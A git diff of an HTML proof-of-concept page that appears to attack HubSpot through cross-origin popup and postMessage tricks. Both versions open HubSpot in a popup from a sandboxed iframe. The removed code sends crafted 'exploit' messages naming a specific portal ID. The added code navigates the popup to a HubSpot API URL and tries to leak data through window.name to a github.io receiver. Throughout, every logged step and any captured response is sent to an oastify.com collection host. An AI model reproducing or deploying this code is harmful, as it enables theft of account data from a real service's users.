@@ -1,47 +1,45 @@
 <!DOCTYPE html>
 <html>
-<head><title>Loading</title></head>
+<head><title>Relay</title></head>
 <body>
-<h1>Processing...</h1>
-<div id="log"></div>
-<script>
-const E = 'https://sb7vo63by517nq7kyd6fe03t8keb2aqz.oastify.com';
-
-function log(m) {
-    document.getElementById('log').innerHTML += '<br>' + m;
-    new Image().src = E + '/?log=' + encodeURIComponent(m);
-}
-
-log('page_loaded');
-
-// Create sandboxed iframe (this makes origin = null)
-const iframe = document.createElement('iframe');
-iframe.sandbox = 'allow-scripts allow-popups allow-same-origin';
-iframe.style.cssText = 'width:100%;height:500px;border:2px solid red';
-
-iframe.srcdoc = `
-<!DOCTYPE html>
-<html>
-<body>
-<h2>Sandbox Active</h2>
+<h1>Relay</h1>
 <div id="status"></div>
 <script>
 const EXFIL = 'https://sb7vo63by517nq7kyd6fe03t8keb2aqz.oastify.com';
 
-function log(m) {
-    document.getElementById('status').innerHTML += '<br>' + m;
-    new Image().src = EXFIL + '/?s=' + encodeURIComponent(m);
+function log(msg) {
+    document.getElementById('status').innerHTML += '<br>' + msg;
+    new Image().src = EXFIL + '/?log=' + encodeURIComponent(msg);
 }
 
-log('START_origin=' + window.origin);
+window.addEventListener('message', function(e) {
+    if (e.data && e.data.action === 'startExploit') {
+        log('TRIGGERED');
+        
+        const blob = new Blob([`
+<html>
+<body>
+<h2>Popup Exploitation</h2>
+<div id="log" style="font-family:monospace;font-size:11px;background:#000;color:#0f0;padding:10px;max-height:350px;overflow:auto;"></div>
+<script>
+const E = 'https://sb7vo63by517nq7kyd6fe03t8keb2aqz.oastify.com';
 
-log('opening_hubspot');
-let hub = window.open('https://app-eu1.hubspot.com', 'hubspot', 'width=800,height=600');
+function l(m) { 
+    const d = document.getElementById('log');
+    d.innerHTML += '<br>' + m;
+    d.scrollTop = d.scrollHeight;
+    new Image().src = E + '/?s=' + encodeURIComponent(m); 
+}
+
+l('START_origin=' + window.origin);
+
+l('opening_hubspot');
+let hub = window.open('https://app-eu1.hubspot.com', 'hubspot', 'width=900,height=700');
 
 if (!hub) {
-    log('popup_blocked');
+    l('ERROR_blocked');
 } else {
-    log('popup_opened');
+    l('popup_opened');
     
     let attempts = 0;
     let checker = setInterval(() => {
@@ -49,73 +47,75 @@ if (!hub) {
         
         try {
             hub.origin;
-            if (attempts % 10 === 0) log('waiting_' + attempts);
+            if (attempts % 20 === 0) l('waiting_' + attempts);
         } catch(e) {
             clearInterval(checker);
-            log('hubspot_loaded_after_' + attempts);
-            
-            // Listen for responses from HubSpot
-            window.addEventListener('message', (resp) => {
-                if (resp.source === hub) {
-                    log('RESPONSE_from_hubspot');
-                    const data = JSON.stringify(resp.data).substring(0, 400);
-                    log('response_data=' + data);
-                    new Image().src = EXFIL + '/?response=' + encodeURIComponent(data);
-                }
-            });
-            
-            // Send exploits
-            setTimeout(() => {
-                log('sending_exploit_1');
-                hub.postMessage({
-                    type: 'CONTENT_ASSISTANCE_DELEGATED_REQUEST',
-                    commandId: 'getdata',
-                    featureId: 'crm',
-                    parameters: {portalId: '46962361'},
-                    resultCount: 100,
-                    language: 'en',
-                    objectId: '46962361',
-                    applicationId: 'crm',
-                    basePath: '/crm',
-                    maxPollingAttempts: 5,
-                    pollingInterval: 200
-                }, '*');
-            }, 1000);
+            l('hubspot_loaded_after_' + attempts);
             
             setTimeout(() => {
-                log('sending_exploit_2');
-                hub.postMessage({
-                    type: 'raw',
-                    _callbackId: 'exploit_' + Date.now(),
-                    body: {
-                        action: 'getData',
-                        portalId: '46962361'
+                l('STARTING_DATA_EXTRACTION');
+                
+                // Navigate to HubSpot API
+                l('navigating_to_api');
+                hub.location = 'https://api.hubapi.com/account-info/v3/details';
+                
+                setTimeout(() => {
+                    l('checking_if_api_loaded');
+                    
+                    try {
+                        let loc = hub.location.href;
+                        l('STILL_ACCESSIBLE_url=' + loc.substring(0, 100));
+                    } catch(err) {
+                        l('cross_origin_confirmed');
+                        
+                        setTimeout(() => {
+                            l('setting_window_name');
+                            
+                            try {
+                                hub.name = 'hubspot_data_' + Date.now();
+                                l('name_set=' + hub.name);
+                            } catch(e) {
+                                l('name_error=' + e.message);
+                            }
+                            
+                            // Navigate to GitHub to read window.name
+                            l('navigating_to_github');
+                            hub.location = 'https://majdch22.github.io/receiver.html';
+                            l('navigation_initiated');
+                            
+                        }, 2000);
                     }
-                }, '*');
+                }, 3000);
+                
             }, 2000);
-            
-            setTimeout(() => {
-                log('sending_exploit_3');
-                hub.postMessage({
-                    type: 'TOGGLE_DARK_MODE',
-                    isDarkMode: true
-                }, '*');
-            }, 3000);
         }
         
-        if (attempts > 100) {
+        if (attempts > 150) {
             clearInterval(checker);
-            log('timeout_after_100');
+            l('timeout');
         }
     }, 100);
 }
-</script>
+<\/script>
 </body>
 </html>
-`;
+        `], {type: 'text/html'});
+        
+        const blobUrl = URL.createObjectURL(blob);
+        
+        const iframe = document.createElement('iframe');
+        iframe.sandbox = 'allow-scripts allow-popups allow-popups-to-escape-sandbox allow-top-navigation';
+        iframe.src = blobUrl;
+        iframe.style.cssText = 'width:100%;height:400px;border:3px solid red';
+        
+        document.body.appendChild(iframe);
+        log('iframe_added');
+    }
+});
 
-document.body.appendChild(iframe);
-log('sandbox_created');
+if(window.opener) {
+    window.opener.postMessage({status:'ready'},'*');
+}
 </script>
 </body>
 </html>
